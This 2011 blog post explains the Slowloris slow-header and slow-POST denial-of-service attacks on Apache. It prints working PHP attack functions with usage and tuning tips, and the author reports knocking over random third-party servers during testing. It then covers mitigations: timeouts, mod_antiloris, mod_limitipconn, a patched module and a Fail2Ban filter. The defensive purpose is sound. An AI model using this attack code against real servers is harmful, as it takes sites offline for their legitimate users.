Title: Slowloris And Mitigations For Apache
Date: 2011-01-12
Author: Seppe "Macuyiko" vanden Broucke

#  Introduction

If you are the least bit interested in network security, you'll undoubtedly have heard about Slowloris by now.

> Slowloris is a piece of software written by Robert "RSnake" Hansen which allows a single machine to take down another machine's web server with minimal bandwidth and side effects on unrelated services and ports. Slowloris tries to keep many connections to the target web server open and hold them open as long as possible. It accomplishes this by opening connections to the target web server and sending a partial request. Periodically, it will send subsequent HTTP headers, adding to--but never completing--the request. Affected servers will keep these connections open, filling their maximum concurrent connection pool, eventually denying additional connection attempts from clients. (From: [Wikipedia](http://en.wikipedia.org/wiki/Slowloris))

The attack is HTTP-based, and attacks webservers by making lots of keep-alive connections and keeping them alive by sending bogus HTTP headers. The server's connection pool gets filled and no other clients can be served. The attack is said to work on a large number of webservers, according to the [project page](http://ha.ckers.org/slowloris/):

  - Apache 1.x
  - Apache 2.x
  - dhttpd
  - GoAhead WebServer
  - WebSense "block pages" (unconfirmed)
  - Trapeze Wireless Web Portal (unconfirmed)
  - Verizon's MI424-WR FIOS Cable modem (unconfirmed)
  - Verizon's Motorola Set-Top Box (port 8082 and requires auth - unconfirmed)
  - BeeWare WAF (unconfirmed)
  - Deny All WAF (unconfirmed)

And does not affect:

  - IIS6.0
  - IIS7.0
  - lighttpd
  - Squid
  - nginx
  - Cherokee (verified by user community)
  - Netscaler
  - Cisco CSS (verified by user community)

Recently, the method was placed in the spotlights again, because both Wikileaks-supporters and non-supporters were using it to DOS a variety of websites and Wikileaks mirrors. Also, recently, an alternative HTTP-based DOS method was found, using POST requests with a large content length ([article](http://www.darkreading.com/vulnerability-management/167901026/security/application-security/228400147/new-http-post-ddos-attack-tools-released.html)).

#  Attack

I run Apache, so, naturally, I was (and still am) concerned about this attack vector. The first step in preventing and solving security problems lies in understanding the attack. Luckily, in this case, the attack is devilishly simple. Based on a PHP version of the original Slowloris attack ([found here](http://seclists.org/fulldisclosure/2009/Jun/207)), I wrote a modified script which also included the new POST-based attack method. The extended version of the script can be found on [Github](https://gist.github.com/771824).

The usage is straightforward:

    ./scriptname.php <method> <number of processes> <server> [host]`

Where:

  - `<method>` is either "get" for the "slow-headers" based attack, or "post" for the new variant;/li>
  - `<number of processes>` determines the number of concurrent requests, around 300 does the trick in most cases;
  - `<server>` is the hostname or IP address of the server you want to target;
  - `[host]` is an optional parameter which will be used in the "Host:"-request header. If left blank the same value as  will be used.

The script really illustrates how simple the attacks are, lets comment a bit on the `attack_get` function:

    function attack_get($server, $host){
        # The following lines set up a normal HTTP1.1 GET request with Keep-Alive
        $request  = "GET / HTTP/1.1\r\n";
        $request .= "Host: $host\r\n";
        # Spoof User-Agent (can be changed)
        $request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n";
        # The following header is, strictly speaking, not necessary, all HTTP1.1 requests are kept alive
        $request .= "Keep-Alive: 900\r\n";
        # Just make the Content-Length large enough
        $request .= "Content-Length: " . rand(10000, 1000000) . "\r\n";
        $request .= "Accept: *.*\r\n";
        # First custom header, name can be changed
        $request .= "X-a: " . rand(1, 10000) . "\r\n";

        # Open socket to webserver and send request
        $sockfd = @fsockopen($server, 80, $errno, $errstr);
        @fwrite($sockfd, $request);

        while (true){
         # Try adding another bogus header
            if (@fwrite($sockfd, "X-c:" . rand(1, 100000) . "\r\n")){
             # Sleep for a bit
                sleep(15);
            }else{
                # Sending failed
            }
        }
    }

The `attack_post` function works very similar:

    function attack_post($server, $host){
        # Send a post request to a random location, eventually you could change this to make sure you post to an existing URL
        $request  = "POST /".md5(rand())." HTTP/1.1\r\n";
        $request .= "Host: $host\r\n";
        $request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n";
        $request .= "Keep-Alive: 900\r\n";
        # "Prepare yourself webserver, we're going to send a lot here, ready?"
        $request .= "Content-Length: 1000000000\r\n";
        $request .= "Content-Type: application/x-www-form-urlencoded\r\n";
        $request .= "Accept: *.*\r\n";

        $sockfd = @fsockopen($server, 80, $errno, $errstr);
        @fwrite($sockfd, $request);

        while (true){
            # Send a small bit of content
            if (@fwrite($sockfd, ".") !== FALSE){
                # Sleep for a bit, pretend that "We're a terribly slow browser, so sorry..."
                sleep(1);
            }else{
                # Sending failed
            }
        }
    }

You can also download an OWASP (Open Web Application Security Project) tool found [here](http://www.owasp.org/index.php/OWASP_HTTP_Post_Tool) which does the same. The tool contains a GUI which lets you choice the attack method (slow headers or slow post), has proxy support, and allows setting attack parameters. The slow header attack can use GET or POST requests, whereas my script above can not and only uses GET. Not that it matters much for that method, as the headers are the crucial factor.

The attack certainly works. In my testing, I was able to DOS about 30% of all sampled webservers (retrieved from just random Google results), including my own. A funny side effect of this method is that, once you stop attacking, the server immediately becomes responsive again as the connection pool is freed. The slow post attack worked more reliable in my testing than the slow headers.

#  Mitigation

Preventing the attack is not easy. The Apache developers are [aware](http://article.gmane.org/gmane.comp.apache.devel/37794) of the problem, but some architectural changes are needed before the problem will be solved. In the meantime, some users have made some suggestions and/or developed solutions themselves:

  - Using Apache modules such as mod_limitipconn, mod qos, mod_evasive, mod_security, mod_noloris, and mod_antiloris.
  - Making some changes to Apache configuration.
  - Using load balancers or proxies. Setting up [Varnish](http://www.varnish-cache.org/) in front of Apache seems to be a popular choice.
  - Using IPTABLES to block a lot of simultaneous requests from the same IP
  - Using Fail2Ban or similar software to ban IP's based on log data
  - Making changes to Linux/FreeBSD network parameters using accf, pfctl, sysctl

Since I want to try to keep things simple, I'll look at the Apache configuration, and some helpful modules.

##  Apache Configuration

This mainly concerns tuning the following: `KeepAliveTimeout` and `Timeout`.

`Timeout` does the following ([docs](http://httpd.apache.org/docs/current/mod/core.html)):

> The TimeOut directive defines the length of time Apache will wait for I/O in various circumstances:
>
> When reading data from the client, the length of time to wait for a TCP packet to arrive if the read buffer is empty.
>
> When writing data to the client, the length of time to wait for an acknowledgement of a packet if the send buffer is full.

This helps a bit, but an attacker could just increase his own sending rate (e.g. lower the sleep time in the functions above) to work around this.

`KeepAliveTimeout` then does:

> The number of seconds Apache will wait for a subsequent request before closing the connection.

Again, the problem remains. An attacker could just increase the sending rate. Note that, when using the slow headers method, the `Timeout` directive above might not help a single bit, since the docs state that:

> Once a request has been received, the timeout value specified by the Timeout directive applies.

But the full receiving of a request itself takes a long, long time.

Turning `KeepAlive` completely off might help, but it is no real remedy. The POST attack still remains an issue. Tweaking with the Apache options alone is thus certainly not enough.

##  mod_antiloris

Some developers have released Apache modules geared to mitigate the Slowloris attack. The two most common ones are `mod_antiloris` and `mod_noloris`. Both use the same trick to prevent attacks. They both hook into connection attempts:

    ap_hook_process_connection(pre_connection, NULL, NULL, APR_HOOK_FIRST);

And count how many connections from the same remote IP are already in the SERVER_BUSY_READ state (the server is reading data from a client). When this count is too high, subsequent connections get denied:

    for (i = 0; i < server_limit; ++i) {
        for (j = 0; j < thread_limit; ++j) {
            ws_record = ap_get_scoreboard_worker(i, j);
            switch (ws_record->status) {
                case SERVER_BUSY_READ:
                    if (strcmp(client_ip, ws_record->client) == 0)
                        ip_count++;
                    break;
                default:
                    break;
            }
        }
    }

    if (ip_read_count > conf->read_limit) {
        ap_log_error(APLOG_MARK, APLOG_WARNING, 0, NULL, "[client %s] rejected, too many connections in READ state", c->remote_ip);
        return OK;
    } else {
        return DECLINED;
    }

Installing [mod_antiloris](http://sourceforge.net/projects/mod-antiloris/) in Ubuntu is a simple matter of executing:

`$ sudo apt-get install libapache2-mod-antiloris`

##  mod_limitipconn

During testing, I discovered that the mod_antiloris module above only protects against the original slow header variant of the Slowloris attack. The slow post was still killing my webserver. So I explored the use of another mod, named [mod_limitipconn](http://dominia.org/djao/limitipconn2.html), which limits simultaneous requests from the same IP.

There is no Apache2 module of `mod_limitipconn` in the Ubuntu repositories, but a Debian deb package is available online and works fine on Ubuntu:

    # Use the i386 package if you have to...
    $ wget http://elonen.iki.fi/code/unofficial-debs/mod-limitipconn/apache2-mod-limitipconn_0.22-2_amd64.deb
    $ sudo dpkg -i ./apache2-mod-limitipconn_0.22-2_amd64.deb
    $ sudo a2enmod limitipconn

Before you restart Apache, create a configuration file at `/etc/apache2/conf.d/limitipconn.conf`:

    ExtendedStatus On
    <IfModule mod_limitipconn.c>
            <Location />
                    # Global settings here
                    MaxConnPerIP 10
                    # No limit for images
                    NoIPLimit image/*
            </Location>
    </IfModule>

Now the server can be restarted:

    $ sudo /etc/init.d/apache2 restart

When investigating the source code of mod_limitipconn, we find the following lines:

    /* Count up the number of connections we are handling right now from
    * this IP address */
    for (i = 0; i < server_limit; ++i) {
        for (j = 0; j < thread_limit; ++j) {
            ws_record = ap_get_scoreboard_worker(i, j);
            switch (ws_record->status) {
                case SERVER_BUSY_READ:
                case SERVER_BUSY_WRITE:
                case SERVER_BUSY_KEEPALIVE:
                case SERVER_BUSY_LOG:
                case SERVER_BUSY_DNS:
                case SERVER_CLOSING:
                case SERVER_GRACEFUL:
                    if (strcmp(address, ws_record->client) == 0)
                        ip_count++;
                    break;
                default:
                    break;
        }
    }

Not much different compared to the previous mods, except that `mod_limitipconn` takes into account all possible server states. Not surprisingly, the attack stopped working after installing this mod. You can disable `mod_antiloris` when using this module. One might wonder which state actually protects against the slow post attack variant. One would except `SERVER_BUSY_READ` to intercept these as well, as the server is, in fact, still reading a request from the client and waiting for it to complete. However, as it turns out, the server actually switches to the `SERVER_BUSY_WRITE` state when receiving a POST, as described on the [mailing lists](http://www.pubbs.net/200910/httpd/29387-crazy-slowloris-mitigation-patch.html):

> However, there is a real problem with all approaches that look for SERVER_BUSY_READ: The attacker can just use a URL that accepts POST requests and send the request body very slowly. These connections have the state SERVER_BUSY_WRITE. This problem affects mod_antiloris and mod_noloris, too (but not mod_reqtimeout). Maybe another state SERVER_BUSY_READ_BODY could be introduced? Or the state could be changed to SERVER_BUSY_READ again when the request body is read?

Interesting information, and some valid points.

##  Modified mod_antiloris

With this in mind I set out to modify mod_antiloris, as I wasn't completely happy with mod_limitipconn. The module works great, but provided too much configuration overhead. I wanted something really simple. The source code for mod_antiloris was quickly edited to include a second counter, and to check the request string (i.e. it has to contain "POST").

    switch (ws_record->status) {
        case SERVER_BUSY_READ:
            if (strcmp(client_ip, ws_record->client) == 0){
         ip_read_count++;
            }
            break;
        case SERVER_BUSY_WRITE:
            if (NULL != strstr(ws_record->request, str_post) && strcmp(client_ip, ws_record->client) == 0){
                ip_write_count++;
            }
            break;
        default:
            break;
    }

I also modified the logging to look a bit more like normal Apache error lines. This will come into play in the next step. The full modified source code is available on [Github](https://gist.github.com/773464).

Installing and compiling the module requires little work:

    $ sudo apt-get install gcc apache2-threaded-dev
    $ wget https://gist.github.com/raw/773464/4e7250692c34f55725384525b513e71be7541f5a/mod_muantiloris.c
    $ sudo apxs2 -a -i -c mod_muantiloris.c
    $ sudo /etc/init.d/apache2 restart

Don't forget to disable mod_antiloris and/or mod_limitipconn if you have them enabled (using `a2dismod`). The modified module uses only two optional configuration directives:

    IPReadLimit (default 5)
    IPPostLimit (default 10)

**Note**: just as with `mod_limitipconn`, the `ExtendedStatus` directive should be set to `On` for this module to work!

The module blocks both attack variants, and logs to `error.log` like so:

`[Tue Jan 11 00:11:35 2011] [warn] [client 0.0.0.0] Antiloris rejected, too many connections in READ state`

Mission successful!

##  Fail2Ban

The following step is optional and only recommended if you already have Fail2Ban installed and running. [Fail2Ban](http://www.fail2ban.org/) is a handy tool to ban IP's based on regex tests on logfiles. (I've caught dozens of Chinese, Brazilian and Russian trespassers already.)

I use the following filter in combination with the modified mod_antiloris above:

    [Definition]
    # Option:  failregex
    # Notes.:  regex to match the password failure messages in the logfile. The
    #          host must be matched by a group named "host". The tag "" can
    #          be used for standard IP/hostname matching and is only an alias for
    #          (?:::f{4,6}:)?(?P[\w\-.^_]+)
    # Values:  TEXT
    #
    failregex = [[]client <host>[]] Antiloris rejected, too many \(POST\) connections in WRITE state
                [[]client <host>[]] Antiloris rejected, too many connections in READ state

    # Option:  ignoreregex
    # Notes.:  regex to ignore. If this regex matches, the line is ignored.
    # Values:  TEXT
    #
    ignoreregex =

I do set the `bantime` to a low value and `maxretry` parameter to a high amount however, as the module tends to generate a lot of error lines and legitimate, aggressive browsers sometimes like to make a lot of concurrent requests as well (mod_limitipconn did have the added benefit of specifying mime type to ignore, although its recognition is based on a reduced URI request string from the Apache scoreboard). Fail2Ban uses IPTables, which has the added benefit that once an IP is banned, Apache can stop dealing with its flooding altogether.

That concludes this blog post. I hope you've found the material helpful. Feel free to use any code here and on Github as you see fit.

